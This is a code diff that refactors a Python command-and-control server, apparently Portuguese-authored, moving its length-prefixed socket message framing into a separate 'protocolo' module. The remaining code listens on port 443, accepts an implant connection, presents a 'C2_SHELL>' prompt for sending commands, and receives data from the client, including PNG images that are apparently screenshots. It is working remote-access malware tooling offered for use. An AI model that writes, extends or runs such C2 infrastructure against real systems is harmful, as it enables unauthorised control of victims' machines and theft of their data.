@@ -1,46 +1,17 @@
 import socket
 import sys
-import struct
 import threading
+import protocolo
 
 LISTEN_IP = "0.0.0.0"
 PORT = 443
-MAX_PAYLOAD_SIZE = 10 * 1024 * 1024  
-
-def enviar_mensagem(sock, payload):
-    if isinstance(payload, str):
-        payload = payload.encode('utf-8')
-    pacote = struct.pack(">I", len(payload)) + payload
-    sock.sendall(pacote)
-
-def receber_bytes_exatos(sock, tamanho_esperado):
-    dados_acumulados = b""
-    while len(dados_acumulados) < tamanho_esperado:
-        bytes_restantes = tamanho_esperado - len(dados_acumulados)
-        pacote = sock.recv(bytes_restantes)
-        if not pacote:
-            raise ConnectionResetError()
-        dados_acumulados += pacote
-    return dados_acumulados
-
-def receber_mensagem(sock):
-    try:
-        bytes_do_tamanho = receber_bytes_exatos(sock, 4)
-        tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
-        
-        if tamanho_do_payload > MAX_PAYLOAD_SIZE:
-            raise ValueError()
-            
-        return receber_bytes_exatos(sock, tamanho_do_payload)
-    except (ConnectionResetError, struct.error, socket.error, ValueError):
-        return None
 
 def receive_handler(client_socket):
     while True:
         try:
-            payload = receber_mensagem(client_socket)
+            payload = protocolo.receber_mensagem(client_socket)
             if payload is None:
-                print("\n[-] Conexão encerrada pelo cliente.\nC2_SHELL> ", end="", flush=True)
+                print("\n[-] Conexão encerrada ou payload inválido.\nC2_SHELL> ", end="", flush=True)
                 break
             
             if payload.startswith(b'\x89PNG\r\n\x1a\n'):
@@ -73,7 +44,6 @@ def start_server():
     try:
         client_socket, client_address = server.accept()
         print(f"[+] Conexão aceita de {client_address[0]}:{client_address[1]}")
-        
         client_socket.settimeout(1.0)
         
         recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
@@ -85,7 +55,7 @@ def start_server():
                 if not command:
                     continue
                     
-                enviar_mensagem(client_socket, command)
+                protocolo.enviar_mensagem(client_socket, command)
                 
                 if command == "/exit":
                     print("[*] Closing connection.")
